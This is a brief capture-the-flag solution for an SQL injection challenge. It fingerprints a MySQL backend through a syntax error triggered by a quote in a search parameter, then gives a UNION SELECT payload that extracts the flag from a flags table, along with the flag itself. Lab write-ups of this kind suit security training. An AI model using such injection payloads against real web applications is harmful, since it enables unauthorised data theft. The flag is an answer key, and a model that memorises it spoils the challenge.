# SQLi-005 Solution

## Fingerprinting via Error Messages

1. Inject `'` to trigger error:
```
GET /search?q='
```

2. Observe error:
```
You have an error in your SQL syntax; check the manual...
```

3. Pattern matches **MySQL**!

## Extract Flag

```sql
' UNION SELECT 1,flag_value,3,4,5 FROM flags-- 
```

## Flag
```
FLAG{3rr0r_m3ss4g3_f1ng3rpr1nt1ng}
```
